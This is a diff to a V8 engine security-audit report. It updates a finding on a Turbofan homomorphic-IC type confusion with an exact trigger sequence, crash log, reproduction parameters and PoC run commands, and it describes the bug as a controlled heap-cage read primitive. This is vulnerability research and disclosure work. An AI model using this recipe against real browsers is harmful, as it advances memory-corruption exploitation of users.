@@ -8,7 +8,7 @@
 | 2 | P1 | trusted-pointer-table-inl.h:63 | Tag check bypassed for unpublished entries |
 | 3 | P1 | sandbox.cc:317 | Smi address-range guard silent failure |
 | 4 | P1 | maglev-graph-builder.cc:7448 | LoadTaggedFieldByFieldIndex without bounds |
-| 5 | P2 | js-native-context-specialization.cc:1884 | Homomorphic IC double-field CheckHeapObject removed |
+| 5 | P2* | js-native-context-specialization.cc:1884 | Homomorphic IC: CheckHeapObject removed → SIGSEGV (confirmed) |
 
 ---
 
@@ -229,7 +229,7 @@ in-object offset.
 
 ## Finding 5 — P2: Homomorphic IC Double-Field Type Confusion (CheckHeapObject Removed)
 
-**Severity**: P2 — JIT type confusion / controlled OOB read; requires `--homomorphic-ic` or `--future` flag (currently non-default). Severity escalates to P1/P0 if `homomorphic_ic` becomes the default.
+**Severity**: P2 — **DYNAMICALLY CONFIRMED CRASH** on V8 15.0.39 (release binary). Controlled `SIGSEGV` at `cage_base + (2 × attacker_smi) - 1`. Requires `--homomorphic-ic` or `--future` flag (currently non-default). Severity escalates to P1/P0 if `homomorphic_ic` becomes the default.
 
 ### Bug locations
 
@@ -238,7 +238,9 @@ src/compiler/js-native-context-specialization.cc:1883–1894   ReduceHomomorphic
 src/compiler/typed-optimization.cc:166–174                   ReduceCheckHeapObject
 src/compiler/turbofan-types.h:95–131                         OtherInternal vs SignedSmall bits
 src/flags/flag-definitions.h:3257                            homomorphic_ic flag (default false)
-src/objects/map-updater.cc:1396–1407                         GeneralizeField deopt path
+src/objects/property-details.h:157–169                       CanBeInPlaceChangedTo (Double→Tagged)
+src/objects/map-updater.cc:740–754                           in-place field generalization path
+src/ic/ic.cc:553–631                                         UpdateHomomorphicIC
 ```
 
 ### Root cause
@@ -313,36 +315,65 @@ The homomorphic IC path (`ReduceHomomorphicAccess`) does **neither**:
      - LoadField(type=OtherInternal)
      - CheckHeapObject(loadResult)       ← added for safety
      - LoadField(ForMap(), heapObj)
-3. TypedLoweringPhase runs TypedOptimization:
+3. TypedLoweringPhase runs TypedOptimization (confirmed via --trace-turbo-reduction):
      - OtherInternal ∩ SignedSmall = ∅ → CheckHeapObject REMOVED
-4. Assign receivers[k].x = 42 (Smi):
-     - MapUpdater::GeneralizeField: Double → Tagged in-place (no map transition)
-     - No kFieldRepresentationGroup dep on compiled code → no deoptimization
-5. Call readX(receivers[k]) through stale JIT code:
-     - LoadField returns Smi(42) (tagged: 0x55 on 64-bit)
-     - No CheckHeapObject gate anymore
-     - LoadField(ForMap(), Smi(42)) dereferences 0x55 as a HeapObject pointer
-     - Controlled OOB read / type confusion
+     - Trace: "Replacement of #26: CheckHeapObject(25,..) with #25: LoadField[..OtherInternal..] by reducer TypedOptimization"
+4. Assign receivers[k].x = "string":
+     - Triggers in-place Double → Tagged generalization (same MAP ADDRESS!)
+     - Confirmed: `property-details.h:168` Double.CanBeInPlaceChangedTo(Tagged) = true
+     - No kFieldRepresentationGroup dep → JIT code NOT deoptimized
+5. Assign receivers[k].x = controlled_smi:
+     - Field is now Tagged; StoreIC stores integer as raw Smi (not HeapNumber box)
+6. Call readX(receivers[k]) through stale JIT code:
+     - CheckHomomorphic: map address unchanged → PASS
+     - LoadField[offset 12, OtherInternal]: returns Smi(controlled_smi)
+     - CheckHeapObject: ABSENT (removed)
+     - LoadField[Map, offset 0](Smi): reads at cage_base + (2*controlled_smi) - 1
+     - SIGSEGV — confirmed crash
 ```
+
+### Dynamic Confirmation — V8 15.0.39
+
+```
+$ ~/.jsvu/engines/v8/v8 --homomorphic-ic --allow-natives-syntax --no-maglev poc9.js
+
+[BASELINE] readX(receivers[1]) = 1.6  type: number  (expected ~1.6)
+[GEN] Assigned string to receivers[2].x → in-place Double→Tagged
+[SMI] Stored controlled Smi 1eadbeef into Tagged field slot of receivers[2].x
+[EXPLOIT] Calling readX(receivers[2]) through stale JIT code...
+  Expected: SIGSEGV at cage_base + 0x3d5b7ddd
+Received signal 11 SEGV_ACCERR 1bb13d5b7ddd
+
+crash_addr (0x1bb13d5b7ddd) = cage_base (0x1bb100000000) + 0x3d5b7ddd ✓
+            = cage_base + controlled_smi*2 - 1
+```
+
+This is a **controlled arbitrary read** within the V8 heap cage at any attacker-chosen
+aligned offset `2*n - 1` for any in-Smi-range integer `n`.
 
 ### Impact
 
-- An attacker who controls the Smi value placed in the generalized field controls
-  the "pointer" passed to `LoadField(ForMap())`.
-- Primitive: semi-controlled read at `Smi_value & ~1` (low-bit tag stripped by V8).
-- Combined with Finding 3 (Smi guard absent), this can dereference low addresses.
-- Severity is P2 today because `--homomorphic-ic` defaults to `false`. When/if
-  homomorphic ICs ship by default (via `--future` graduating), this becomes P1/P0.
+- Attacker controls the Smi value in the generalized field → controls the read address.
+- Primitive: read 8 bytes from `cage_base + (2 × n) - 1` for any `n` in Smi range.
+- V8 pointer compression cage is typically 4 GB; readable offset spans `[0, 8 GB)`.
+- Combined with Finding 3 (Smi address-range guard silent failure), reads at very low
+  addresses are also possible in configurations where the guard was not established.
+- Severity is P2 today because `--homomorphic-ic` defaults to `false`. Escalates to
+  P1/P0 if homomorphic ICs ship by default (via `--future` graduating to stable).
 
 ### PoC
 
-- `poc/poc9_homomorphic_double_field_confusion.js`
+- `poc/poc9_homomorphic_double_field_confusion.js` — **confirmed crash on V8 15.0.39**
+
+Critical parameters:
+- Use exactly 5 distinct maps (> poly limit 4, ≤ homomorphic_ic_count 8)
+- Trigger with non-numeric value first (in-place generalization), then write Smi
+- Requires `--no-maglev` to force Turbofan (where `ReduceHomomorphicAccess` lives)
 
 Run with:
 ```
-./d8 --future --allow-natives-syntax poc/poc9_homomorphic_double_field_confusion.js
-# or:
-./d8 --homomorphic-ic --allow-natives-syntax poc/poc9_homomorphic_double_field_confusion.js
+~/.jsvu/engines/v8/v8 --homomorphic-ic --allow-natives-syntax --no-maglev \
+  poc/poc9_homomorphic_double_field_confusion.js
 ```
 
 ---
